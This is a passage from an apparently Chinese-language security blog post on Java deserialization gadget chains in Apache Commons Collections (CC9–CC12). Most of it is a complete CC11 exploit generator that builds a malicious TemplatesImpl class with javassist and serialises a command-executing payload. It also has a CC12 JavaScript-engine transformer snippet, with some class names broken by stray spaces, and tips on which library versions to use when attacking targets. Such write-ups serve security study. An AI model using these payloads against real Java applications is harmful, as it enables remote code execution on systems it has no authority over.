<h2 id="0x3-9-Commons-Collections9"><a href="#0x3-9-Commons-Collections9" class="headerlink" title="0x3.9 Commons  Collections9"></a>0x3.9 Commons  Collections9</h2><p>主要利用的是CommonsCollections:3.2版本新增的DefaultedMap来代替LazyMap，因为这两个Map有同样的get函数可以被利用</p>
<h2 id="0x3-10-Commons-Collections10"><a href="#0x3-10-Commons-Collections10" class="headerlink" title="0x3.10 Commons Collections10"></a>0x3.10 Commons Collections10</h2><p>区别CC7，LazyMap被换成了TiedMapEntry</p>
<pre><code>  Hashtable.readObject()
  -&gt; Hashtable.reconstitutionPut
  -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()
  -&gt; TiedMapEntry.getValue
  -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()
  -&gt; factory.transform() =&gt; ChainedTransformer.transform()
  -&gt; Runtime.getRuntime().exec()
</code></pre>
<h2 id="0x3-11-Commons-Collections-11"><a href="#0x3-11-Commons-Collections-11" class="headerlink" title="0x3.11 Commons Collections 11"></a>0x3.11 Commons Collections 11</h2><p>限制：</p>
<ul>
<li>CommonsCollections 3.1-3.2.1</li>
<li>JDK版本：暂无限制</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings(&quot;all&quot;)
public class CC11 &#123;
    public static void main(String[] args) throws Exception &#123;
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;open  /System/Applications/Calculator.app\&quot;);&quot;;
      
        // 利用javasist动态创建恶意字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;Cat&quot;);
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错

        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField(&quot;_name&quot;);
        f0.setAccessible(true);
        f0.set(templates,&quot;name&quot;);

        f0 = templates.getClass().getDeclaredField(&quot;_class&quot;);
        f0.setAccessible(true);
        f0.set(templates,null);

        InvokerTransformer transformer = new InvokerTransformer(&quot;asdfasdfasdf&quot;, new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add(&quot;foo&quot;);
        Field f = null;
        try &#123;
            f = HashSet.class.getDeclaredField(&quot;map&quot;);
        &#125; catch (NoSuchFieldException e) &#123;
            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
        &#125;
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try &#123;
            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
        &#125; catch (NoSuchFieldException e) &#123;
            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
        &#125;

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null)&#123;
            node = array[1];
        &#125;
        Field keyField = null;
        try&#123;
            keyField = node.getClass().getDeclaredField(&quot;key&quot;);
        &#125;catch(Exception e)&#123;
            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
        &#125;
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
        f3.setAccessible(true);
        f3.set(transformer,&quot;newTransformer&quot;);

        try&#123;
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc11&quot;));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc11&quot;));
            inputStream.readObject();
        &#125;catch(Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;

&#125;
</code></pre>
<h2 id="0x12-Commons-Collections-12"><a href="#0x12-Commons-Collections-12" class="headerlink" title="0x12 Commons Collections 12"></a>0x12 Commons Collections 12</h2><p>与CC6的区别就是引入了js来支持执行更多命令，主要修改了transformer的构造</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8673">https://xz.aliyun.com/t/8673</a></p>
<pre><code class="java">String[] execArgs = new String[]&#123;cmd&#125;;
      Transformer[] transformers = new Transformer[]&#123;new ConstantTransformer(S criptEngineManager.class),
              new InvokerTransformer(&quot;newInstance&quot;, new Class[0], new O bject[0]),
              new InvokerTransformer(&quot;getEngineByName&quot;, new Class[]&#123;String.class&#125;,
                      new O bject[]&#123;&quot;JavaScript&quot;&#125;), new InvokerTransformer(&quot;eval&quot;,
              new Class[]&#123;String.class&#125;, execArgs), new ConstantTransformer(1)&#125;;
</code></pre>
<h1 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h1><h2 id="0x4-1-适用版本总结"><a href="#0x4-1-适用版本总结" class="headerlink" title="0x4.1 适用版本总结"></a>0x4.1 适用版本总结</h2><p>CommonsCollections1 commons-collections:3.1</p>
<p>CommonsCollections1,3,5,6,7,10用的还是commons-collections:3.1</p>
<p>CommonsCollections9 适用于3.2.1</p>
<p>CommonsCollections2,4,8，其利用链基于CommonsCollections:4.0版本</p>
<p>CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制</p>
<p>CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制</p>
<p>最后，据不完全统计推荐打CC的时候，</p>
<p>建议本地使用JDK7 commons-collections4-4.0 分别用CC4、CC3生成两个版本</p>
<p>建议本地使用JDK7 commons-collections3.1 用CC10或者CC11生成payload 3.* 都可以打</p>
<h2 id="0x4-2-CC链总结"><a href="#0x4-2-CC链总结" class="headerlink" title="0x4.2 CC链总结"></a>0x4.2 CC链总结</h2><p>重要的不是这个链多变的形式，而是怎么发现的。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10457#toc-12">https://xz.aliyun.com/t/10457#toc-12</a></p>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/120">https://forum.butian.net/share/120</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/313390.html">https://www.freebuf.com/articles/web/313390.html</a></p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/05/23/Java/JNDI%E6%B3%A8%E5%85%A5/">prev</a><a class="next" href="/2022/05/17/X86%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84Hook%E6%96%B9%E5%BC%8F/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>